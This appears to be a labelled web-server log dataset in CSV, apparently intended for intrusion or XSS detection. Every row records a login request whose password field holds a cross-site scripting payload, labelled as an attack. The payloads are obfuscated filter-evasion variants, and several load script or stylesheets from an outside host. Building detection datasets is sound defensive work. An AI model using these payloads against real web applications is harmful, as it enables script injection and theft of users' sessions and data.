,ip_address,date,hour,minute,seconds,protocol,username,password,status,respsize,timed,label
144,192.108.116.88,18/Dec/2017,14,06,04,POST,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,200,1073,,1
145,192.108.116.88,18/Dec/2017,14,06,04,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,304,-,,1
146,192.108.116.88,18/Dec/2017,14,06,04,GET,datalab,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,304,-,,1
147,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,1040,1,1
148,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,945,1,1
149,192.108.116.88,18/Dec/2017,14,06,31,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,34463,2,1
150,192.108.116.88,18/Dec/2017,14,06,32,POST,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",200,1073,167,1
151,192.108.116.88,18/Dec/2017,14,06,33,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",304,-,0,1
152,192.108.116.88,18/Dec/2017,14,06,33,GET,datalab,"<IMG SRC=jav	ascript:alert('XSS');"">",304,-,0,1
153,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,1040,12,1
154,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,945,6,1
155,192.108.116.88,18/Dec/2017,14,06,57,GET,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",200,34463,4,1
156,192.108.116.88,18/Dec/2017,14,08,57,POST,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",-,-,-,1
157,192.108.116.88,18/Dec/2017,14,10,58,POST,datalab,"<IMG SRC=jav&#x09;ascript:alert('XSS');"">",-,-,-,1
158,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,1040,3,1
159,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,945,12,1
160,192.108.116.88,18/Dec/2017,14,11,17,GET,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",200,34463,1,1
161,192.108.116.88,18/Dec/2017,14,13,17,POST,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",-,-,-,1
162,192.108.116.88,18/Dec/2017,14,15,17,POST,datalab,"<IMG SRC=jav&#x0A;ascript:alert('XSS');"">",-,-,-,1
163,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,1040,27,1
164,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,945,22,1
165,192.108.116.88,18/Dec/2017,14,15,36,GET,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",200,34463,3,1
166,192.108.116.88,18/Dec/2017,14,17,36,POST,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",-,-,-,1
167,192.108.116.88,18/Dec/2017,14,19,36,POST,datalab,"<IMG SRC=jav&#x0D;ascript:alert('XSS');"">",-,-,-,1
168,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,31,1
169,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,41,1
170,192.108.116.88,18/Dec/2017,14,24,13,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,13,1
171,192.108.116.88,18/Dec/2017,14,24,14,POST,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,218,1
172,192.108.116.88,18/Dec/2017,14,24,14,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,5,1
173,192.108.116.88,18/Dec/2017,14,24,14,GET,datalab,"<SCRIPT/XSS SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,5,1
174,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,1040,1,1
175,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,945,17,1
176,192.108.116.88,18/Dec/2017,14,24,33,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,34463,3,1
177,192.108.116.88,18/Dec/2017,14,24,34,POST,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",200,1073,158,1
178,192.108.116.88,18/Dec/2017,14,24,34,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",304,-,1,1
179,192.108.116.88,18/Dec/2017,14,24,34,GET,datalab,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",304,-,10,1
180,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1040,4,1
181,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,945,1,1
182,192.108.116.88,18/Dec/2017,14,24,50,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,34463,1,1
183,192.108.116.88,18/Dec/2017,14,24,51,POST,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",200,1073,172,1
184,192.108.116.88,18/Dec/2017,14,24,51,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,0,1
185,192.108.116.88,18/Dec/2017,14,24,51,GET,datalab,"<SCRIPT/SRC=http://ha.ckers.org/xss.js""></SCRIPT>",304,-,2,1
186,192.108.116.88,18/Dec/2017,14,25,10,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,1040,0,1
187,192.108.116.88,18/Dec/2017,14,25,10,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,945,0,1
188,192.108.116.88,18/Dec/2017,14,25,10,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,34463,6,1
189,192.108.116.88,18/Dec/2017,14,25,11,POST,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",200,1073,126,1
190,192.108.116.88,18/Dec/2017,14,25,11,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",304,-,0,1
191,192.108.116.88,18/Dec/2017,14,25,11,GET,datalab,"<<SCRIPT>alert(XSS"");//<</SCRIPT>",304,-,0,1
192,192.108.116.88,18/Dec/2017,14,25,27,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,1040,,1
193,192.108.116.88,18/Dec/2017,14,25,27,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,945,,1
194,192.108.116.88,18/Dec/2017,14,25,27,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,34463,,1
195,192.108.116.88,18/Dec/2017,14,25,28,POST,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,200,1073,,1
196,192.108.116.88,18/Dec/2017,14,25,28,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,304,-,,1
197,192.108.116.88,18/Dec/2017,14,25,28,GET,datalab,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,304,-,,1
198,192.108.116.88,18/Dec/2017,14,25,54,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,1040,,1
199,192.108.116.88,18/Dec/2017,14,25,54,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,945,,1
200,192.108.116.88,18/Dec/2017,14,25,54,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,34463,,1
201,192.108.116.88,18/Dec/2017,14,25,55,POST,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,200,1073,,1
202,192.108.116.88,18/Dec/2017,14,25,55,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,304,-,,1
203,192.108.116.88,18/Dec/2017,14,25,55,GET,datalab,<SCRIPT SRC=//ha.ckers.org/.j>,304,-,,1
204,192.108.116.88,18/Dec/2017,14,26,15,GET,datalab,"<IMG SRC=javascript:alert('XSS')""",200,1040,1,1
205,192.108.116.88,18/Dec/2017,14,26,15,GET,datalab,"<IMG SRC=javascript:alert('XSS')""",200,945,6,1
206,192.108.116.88,18/Dec/2017,14,26,15,GET,datalab,"<IMG SRC=javascript:alert('XSS')""",200,34463,2,1
207,192.108.116.88,18/Dec/2017,14,28,15,POST,datalab,"<IMG SRC=javascript:alert('XSS')""",-,-,-,1
208,192.108.116.88,18/Dec/2017,14,30,15,POST,datalab,"<IMG SRC=javascript:alert('XSS')""",-,-,-,1
209,192.108.116.88,18/Dec/2017,14,30,34,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,1040,,1
210,192.108.116.88,18/Dec/2017,14,30,34,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,945,,1
211,192.108.116.88,18/Dec/2017,14,30,34,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,34463,,1
212,192.108.116.88,18/Dec/2017,14,30,35,POST,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,200,1073,,1
213,192.108.116.88,18/Dec/2017,14,30,35,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,304,-,,1
214,192.108.116.88,18/Dec/2017,14,30,35,GET,datalab,<iframe src=http://ha.ckers.org/scriptlet.html <,304,-,,1
215,192.108.116.88,18/Dec/2017,14,30,52,GET,datalab,\;alert('XSS');//,200,1040,2,1
216,192.108.116.88,18/Dec/2017,14,30,53,GET,datalab,\;alert('XSS');//,200,945,3,1
217,192.108.116.88,18/Dec/2017,14,30,53,GET,datalab,\;alert('XSS');//,200,34463,1,1
218,192.108.116.88,18/Dec/2017,14,32,53,POST,datalab,\;alert('XSS');//,-,-,-,1
219,192.108.116.88,18/Dec/2017,14,34,53,POST,datalab,\;alert('XSS');//,-,-,-,1
220,192.108.116.88,18/Dec/2017,14,35,14,GET,datalab,</script><script>alert('XSS');</script>,200,1040,,1
221,192.108.116.88,18/Dec/2017,14,35,15,GET,datalab,</script><script>alert('XSS');</script>,200,945,,1
222,192.108.116.88,18/Dec/2017,14,35,15,GET,datalab,</script><script>alert('XSS');</script>,200,34463,,1
223,192.108.116.88,18/Dec/2017,14,37,15,POST,datalab,</script><script>alert('XSS');</script>,-,-,,1
224,192.108.116.88,18/Dec/2017,14,39,15,POST,datalab,</script><script>alert('XSS');</script>,-,-,,1
225,192.108.116.88,18/Dec/2017,14,39,35,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,1040,30,1
226,192.108.116.88,18/Dec/2017,14,39,35,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,945,12,1
227,192.108.116.88,18/Dec/2017,14,39,36,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,34463,6,1
228,192.108.116.88,18/Dec/2017,14,39,36,POST,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",200,1073,201,1
229,192.108.116.88,18/Dec/2017,14,39,37,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",304,-,1,1
230,192.108.116.88,18/Dec/2017,14,39,37,GET,datalab,"</TITLE><SCRIPT>alert(XSS"");</SCRIPT>",304,-,0,1
231,192.108.116.88,18/Dec/2017,14,44,57,GET,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",200,1040,39,1
232,192.108.116.88,18/Dec/2017,14,46,08,GET,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",200,945,33,1
233,192.108.116.88,18/Dec/2017,14,46,09,GET,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",200,34463,18,1
234,192.108.116.88,18/Dec/2017,14,48,08,POST,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
235,192.108.116.88,18/Dec/2017,14,50,09,POST,datalab,"<BODY BACKGROUND=javascript:alert('XSS')"">",-,-,-,1
236,192.108.116.88,18/Dec/2017,14,50,28,GET,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",200,1040,33,1
237,192.108.116.88,18/Dec/2017,14,50,28,GET,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",200,945,60,1
238,192.108.116.88,18/Dec/2017,14,50,28,GET,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",200,34463,4,1
239,192.108.116.88,18/Dec/2017,14,52,28,POST,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",-,-,-,1
240,192.108.116.88,18/Dec/2017,14,54,29,POST,datalab,"<IMG DYNSRC=javascript:alert('XSS')"">",-,-,-,1
241,192.108.116.88,18/Dec/2017,14,54,49,GET,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",200,1040,79,1
242,192.108.116.88,18/Dec/2017,14,54,49,GET,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",200,945,63,1
243,192.108.116.88,18/Dec/2017,14,54,50,GET,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",200,34463,17,1
244,192.108.116.88,18/Dec/2017,14,56,49,POST,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",-,-,-,1
245,192.108.116.88,18/Dec/2017,14,58,50,POST,datalab,"<IMG LOWSRC=javascript:alert('XSS')"">",-,-,-,1
246,192.108.116.88,18/Dec/2017,14,59,12,GET,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",200,1040,132,1
247,192.108.116.88,18/Dec/2017,14,59,12,GET,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",200,945,64,1
248,192.108.116.88,18/Dec/2017,14,59,12,GET,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",200,34463,3,1
249,192.108.116.88,18/Dec/2017,15,01,12,POST,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",-,-,-,1
250,192.108.116.88,18/Dec/2017,15,03,13,POST,datalab,"<STYLE>li {list-style-image: url(javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",-,-,-,1
251,192.108.116.88,18/Dec/2017,15,03,31,GET,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",200,1040,33,1
252,192.108.116.88,18/Dec/2017,15,03,31,GET,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",200,945,51,1
253,192.108.116.88,18/Dec/2017,15,03,32,GET,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",200,34463,2,1
254,192.108.116.88,18/Dec/2017,15,05,31,POST,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",-,-,-,1
255,192.108.116.88,18/Dec/2017,15,07,32,POST,datalab,"<IMG SRC='vbscript:msgbox(XSS"")'>",-,-,-,1
256,192.108.116.88,18/Dec/2017,15,07,53,GET,datalab,"<IMG SRC=livescript:[code]"">",200,1040,43,1
257,192.108.116.88,18/Dec/2017,15,07,54,GET,datalab,"<IMG SRC=livescript:[code]"">",200,945,12,1
258,192.108.116.88,18/Dec/2017,15,07,54,GET,datalab,"<IMG SRC=livescript:[code]"">",200,34463,5,1
259,192.108.116.88,18/Dec/2017,15,07,55,POST,datalab,"<IMG SRC=livescript:[code]"">",200,1073,225,1
260,192.108.116.88,18/Dec/2017,15,07,55,GET,datalab,"<IMG SRC=livescript:[code]"">",304,-,2,1
261,192.108.116.88,18/Dec/2017,15,07,55,GET,datalab,"<IMG SRC=livescript:[code]"">",304,-,1,1
262,192.108.116.88,18/Dec/2017,15,08,18,GET,datalab,<BODY ONLOAD=alert('XSS')>,200,1040,,1
263,192.108.116.88,18/Dec/2017,15,08,18,GET,datalab,<BODY ONLOAD=alert('XSS')>,200,945,,1
264,192.108.116.88,18/Dec/2017,15,08,18,GET,datalab,<BODY ONLOAD=alert('XSS')>,200,34463,,1
265,192.108.116.88,18/Dec/2017,15,10,18,POST,datalab,<BODY ONLOAD=alert('XSS')>,-,-,,1
266,192.108.116.88,18/Dec/2017,15,12,19,POST,datalab,<BODY ONLOAD=alert('XSS')>,-,-,,1
267,192.108.116.88,18/Dec/2017,15,12,39,GET,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",200,1040,40,1
268,192.108.116.88,18/Dec/2017,15,12,39,GET,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",200,945,60,1
269,192.108.116.88,18/Dec/2017,15,12,39,GET,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",200,34463,3,1
270,192.108.116.88,18/Dec/2017,15,14,39,POST,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",-,-,-,1
271,192.108.116.88,18/Dec/2017,15,16,40,POST,datalab,"<BGSOUND SRC=javascript:alert('XSS');"">",-,-,-,1
272,192.108.116.88,18/Dec/2017,15,16,54,GET,datalab,"<BR SIZE=&{alert('XSS')}"">",200,1040,34,1
273,192.108.116.88,18/Dec/2017,15,16,54,GET,datalab,"<BR SIZE=&{alert('XSS')}"">",200,945,52,1
274,192.108.116.88,18/Dec/2017,15,16,54,GET,datalab,"<BR SIZE=&{alert('XSS')}"">",200,34463,4,1
275,192.108.116.88,18/Dec/2017,15,18,54,POST,datalab,"<BR SIZE=&{alert('XSS')}"">",-,-,-,1
276,192.108.116.88,18/Dec/2017,15,20,54,POST,datalab,"<BR SIZE=&{alert('XSS')}"">",-,-,-,1
277,192.108.116.88,18/Dec/2017,15,26,02,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,1040,,1
278,192.108.116.88,18/Dec/2017,15,26,02,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,945,,1
279,192.108.116.88,18/Dec/2017,15,26,02,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,34463,,1
280,192.108.116.88,18/Dec/2017,15,28,02,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
281,192.108.116.88,18/Dec/2017,15,30,02,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
282,192.108.116.88,18/Dec/2017,15,40,24,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,1040,,1
283,192.108.116.88,18/Dec/2017,15,40,24,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,945,,1
284,192.108.116.88,18/Dec/2017,15,40,24,GET,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,200,34463,,1
285,192.108.116.88,18/Dec/2017,15,42,24,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
286,192.108.116.88,18/Dec/2017,15,44,25,POST,datalab,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,-,-,,1
287,192.108.116.88,18/Dec/2017,15,45,08,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,1040,1,1
288,192.108.116.88,18/Dec/2017,15,45,08,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,945,1,1
289,192.108.116.88,18/Dec/2017,15,45,09,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,34463,1,1
290,192.108.116.88,18/Dec/2017,15,45,11,POST,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",200,1073,197,1
291,192.108.116.88,18/Dec/2017,15,45,11,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",304,-,0,1
292,192.108.116.88,18/Dec/2017,15,45,11,GET,datalab,"<STYLE>BODY{-moz-binding:url(http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",304,-,0,1
293,192.108.116.88,18/Dec/2017,15,45,33,GET,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",200,1040,0,1
294,192.108.116.88,18/Dec/2017,15,45,33,GET,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",200,945,1,1
295,192.108.116.88,18/Dec/2017,15,45,34,GET,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",200,34463,0,1
296,192.108.116.88,18/Dec/2017,15,47,33,POST,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",-,-,-,1
297,192.108.116.88,18/Dec/2017,15,49,34,POST,datalab,"<STYLE>@im\port'\ja\vasc\ript:alert(XSS"")';</STYLE>",-,-,-,1
298,192.108.116.88,18/Dec/2017,15,49,52,GET,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",200,1040,26,1
299,192.108.116.88,18/Dec/2017,15,49,52,GET,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",200,945,23,1
300,192.108.116.88,18/Dec/2017,15,49,52,GET,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",200,34463,14,1
301,192.108.116.88,18/Dec/2017,15,51,52,POST,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",-,-,-,1
302,192.108.116.88,18/Dec/2017,15,53,53,POST,datalab,"<IMG STYLE=xss:expr/*XSS*/ession(alert('XSS'))"">",-,-,-,1
